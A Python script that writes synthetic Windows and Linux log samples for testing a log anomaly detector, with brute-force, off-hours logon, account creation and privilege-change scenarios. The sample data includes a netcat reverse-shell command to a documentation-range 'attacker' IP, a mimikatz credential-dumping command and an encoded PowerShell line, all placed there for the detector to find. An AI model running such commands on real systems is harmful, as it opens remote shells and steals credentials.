#!/usr/bin/env python3
"""
generate_samples.py
--------------------
Builds the sample log files used to test and demo the Log Anomaly
Detector. Every account name, IP address, and "suspicious" command here
is synthetic - there is no real attacker, victim, or credential involved.

IP address scheme used throughout:
    192.168.10.0/24   - the internal corporate network
    203.0.113.0/24     - RFC 5737 "documentation" range, reserved by the
                         IETF for examples like this one and never
                         routable on the real internet - used here to
                         stand in for an external attacker's IP.

Run from anywhere; writes files into this same sample_logs/ directory:

    python sample_logs/generate_samples.py
"""

import os
from datetime import datetime, timedelta

import pandas as pd

OUT_DIR = os.path.dirname(os.path.abspath(__file__))

WINDOWS_COLUMNS = ["TimeCreated", "EventID", "Account", "SourceIP",
                   "TargetAccount", "ProcessName", "CommandLine", "Message"]

DAY = "2026-06-15"


def save_windows(name, rows):
    df = pd.DataFrame(rows, columns=WINDOWS_COLUMNS)
    path = os.path.join(OUT_DIR, name)
    df.to_csv(path, index=False)
    print(f"Wrote {len(df)} events to {path}")


def save_linux(name, lines):
    path = os.path.join(OUT_DIR, name)
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    print(f"Wrote {len(lines)} lines to {path}")


# --- Windows event builders -------------------------------------------------

def w_logon_success(time, account, ip):
    return {"TimeCreated": time, "EventID": 4624, "Account": account, "SourceIP": ip,
            "TargetAccount": "", "ProcessName": "", "CommandLine": "",
            "Message": f"An account was successfully logged on. Account: {account}, Source IP: {ip}"}


def w_logon_failed(time, account, ip):
    return {"TimeCreated": time, "EventID": 4625, "Account": account, "SourceIP": ip,
            "TargetAccount": "", "ProcessName": "", "CommandLine": "",
            "Message": f"An account failed to log on. Account: {account}, Source IP: {ip}"}


def w_account_created(time, creator, new_account):
    return {"TimeCreated": time, "EventID": 4720, "Account": creator, "SourceIP": "",
            "TargetAccount": new_account, "ProcessName": "", "CommandLine": "",
            "Message": f"A user account was created. New account: {new_account}, Created by: {creator}"}


def w_privilege_change(time, actor, target, group):
    return {"TimeCreated": time, "EventID": 4732, "Account": actor, "SourceIP": "",
            "TargetAccount": target, "ProcessName": "", "CommandLine": "",
            "Message": f"A member was added to a security-enabled group. Member: {target}, Group: {group}"}


def w_process(time, account, process_name, command_line):
    return {"TimeCreated": time, "EventID": 4688, "Account": account, "SourceIP": "",
            "TargetAccount": "", "ProcessName": process_name, "CommandLine": command_line,
            "Message": f"A new process has been created. Process Name: {process_name}"}


def baseline_logons():
    """A handful of ordinary business-hours logons, reused across several
    sample files so each one has a believable statistical baseline."""
    accounts = ["jsmith", "amartinez", "rwilliams", "ktaylor"]
    hours = [8, 9, 10, 11, 13, 14, 15, 16, 17]
    rows = []
    ip_suffix = 20
    for hour in hours:
        for account in accounts:
            ip_suffix = 20 + (ip_suffix - 19) % 30
            rows.append(w_logon_success(f"{DAY} {hour:02d}:05:00", account, f"192.168.10.{ip_suffix}"))
    return rows


# --- Windows sample files -----------------------------------------------

def build_windows_normal():
    return baseline_logons()


def build_windows_bruteforce():
    rows = baseline_logons()
    attacker_ip = "203.0.113.66"
    targets = ["admin", "administrator", "root", "svc_backup", "jsmith", "guest", "test", "oracle", "sa", "deploy"]
    # 25 seconds apart so all 10 attempts land inside one 5-minute window.
    start = datetime.strptime(f"{DAY} 02:10:00", "%Y-%m-%d %H:%M:%S")
    for i, target in enumerate(targets):
        ts = start + timedelta(seconds=25 * i)
        rows.append(w_logon_failed(ts.strftime("%Y-%m-%d %H:%M:%S"), target, attacker_ip))
    # The attacker eventually guesses correctly.
    last = start + timedelta(seconds=25 * len(targets) + 30)
    rows.append(w_logon_success(last.strftime("%Y-%m-%d %H:%M:%S"), "admin", attacker_ip))
    return rows


def build_windows_unusual_hours():
    rows = baseline_logons()
    rows.append(w_logon_success(f"{DAY} 03:10:00", "jsmith", "192.168.10.45"))
    rows.append(w_logon_success(f"{DAY} 03:40:00", "ktaylor", "192.168.10.46"))
    return rows


def build_windows_new_account():
    rows = baseline_logons()
    rows.append(w_account_created(f"{DAY} 02:30:00", "svc_admin", "backup_svc2"))
    return rows


def build_windows_privilege_escalation():
    rows = baseline_logons()
    rows.append(w_privilege_change(f"{DAY} 10:15:00", "itadmin", "tcontractor", "Administrators"))
    return rows


def build_windows_suspicious_process():
    rows = baseline_logons()
    for t in ("09:10:00", "11:45:00", "15:20:00"):
        rows.append(w_process(f"{DAY} {t}", "jsmith", "notepad.exe", "notepad.exe report.txt"))
    rows.append(w_process(f"{DAY} 13:05:00", "ktaylor", "powershell.exe",
                           "powershell.exe -enc JABzAD0AbgBlAHcALQBvAGIAagBlAGMAdAA="))
    rows.append(w_process(f"{DAY} 14:00:00", "svc_backup", "backup_tool42.exe",
                           "backup_tool42.exe --silent --target=\\\\fileserver\\backups"))
    return rows


def build_windows_mixed():
    rows = baseline_logons()
    rows.append(w_account_created(f"{DAY} 02:30:00", "svc_admin", "backup_svc2"))
    rows.append(w_privilege_change(f"{DAY} 02:35:00", "svc_admin", "backup_svc2", "Administrators"))
    rows.append(w_process(f"{DAY} 02:40:00", "backup_svc2", "mimikatz.exe", "mimikatz.exe \"sekurlsa::logonpasswords\""))
    return rows


# --- Linux line builders -------------------------------------------------

def l_accepted(time, account, ip, pid=1000):
    return f"Jun 15 {time} corp-server sshd[{pid}]: Accepted password for {account} from {ip} port 51{pid % 1000} ssh2"


def l_failed(time, account, ip, pid=1000, invalid=False):
    user_part = f"invalid user {account}" if invalid else account
    return f"Jun 15 {time} corp-server sshd[{pid}]: Failed password for {user_part} from {ip} port 51{pid % 1000} ssh2"


def l_useradd(time, account, uid=1010, pid=2000):
    return f"Jun 15 {time} corp-server useradd[{pid}]: new user: name={account}, UID={uid}"


def l_groupadd(time, account, group, pid=2001):
    return f"Jun 15 {time} corp-server usermod[{pid}]: add '{account}' to group '{group}'"


def l_sudo(time, account, command, pid=3000):
    return (f"Jun 15 {time} corp-server sudo:    {account} : TTY=pts/0 ; "
            f"PWD=/home/{account} ; USER=root ; COMMAND={command}")


def baseline_linux_logons():
    accounts = ["ahmed", "priya", "diego"]
    hours = [8, 9, 11, 13, 15, 17]
    lines = []
    pid = 1000
    for hour in hours:
        for account in accounts:
            pid += 1
            lines.append(l_accepted(f"{hour:02d}:10:00", account, f"192.168.10.{50 + pid % 30}", pid))
    return lines


def build_linux_normal():
    return baseline_linux_logons()


def build_linux_bruteforce():
    lines = baseline_linux_logons()
    attacker_ip = "203.0.113.91"
    targets = ["root", "admin", "ubuntu", "ahmed", "test", "deploy", "postgres", "ftpuser"]
    # 25 seconds apart so all 8 attempts land inside one 5-minute window.
    start = datetime.strptime("03:14:00", "%H:%M:%S")
    pid = 9000
    for i, target in enumerate(targets):
        pid += 1
        ts = start + timedelta(seconds=25 * i)
        lines.append(l_failed(ts.strftime("%H:%M:%S"), target, attacker_ip, pid, invalid=(target != "ahmed")))
    return lines


def build_linux_mixed():
    lines = baseline_linux_logons()
    # An unusual-hour login by a legitimate-looking account.
    lines.append(l_accepted("04:05:00", "diego", "192.168.10.77", 9500))
    # A brute-force burst from a different attacker, 25 seconds apart so
    # every attempt lands inside one 5-minute window.
    attacker_ip = "203.0.113.40"
    start = datetime.strptime("04:30:00", "%H:%M:%S")
    pid = 9600
    for i, target in enumerate(["root", "admin", "pi", "ubuntu", "guest", "oracle"]):
        pid += 1
        ts = start + timedelta(seconds=25 * i)
        lines.append(l_failed(ts.strftime("%H:%M:%S"), target, attacker_ip, pid, invalid=True))
    # A suspicious sudo command - spawning a reverse shell.
    lines.append(l_sudo("04:40:00", "diego", "/bin/nc -e /bin/sh 203.0.113.40 4444"))
    return lines


def main():
    save_windows("windows_normal.csv", build_windows_normal())
    save_windows("windows_bruteforce.csv", build_windows_bruteforce())
    save_windows("windows_unusual_hours.csv", build_windows_unusual_hours())
    save_windows("windows_new_account.csv", build_windows_new_account())
    save_windows("windows_privilege_escalation.csv", build_windows_privilege_escalation())
    save_windows("windows_suspicious_process.csv", build_windows_suspicious_process())
    save_windows("mixed_windows.csv", build_windows_mixed())

    save_linux("linux_auth_normal.log", build_linux_normal())
    save_linux("linux_auth_bruteforce.log", build_linux_bruteforce())
    save_linux("mixed_linux.log", build_linux_mixed())


if __name__ == "__main__":
    main()
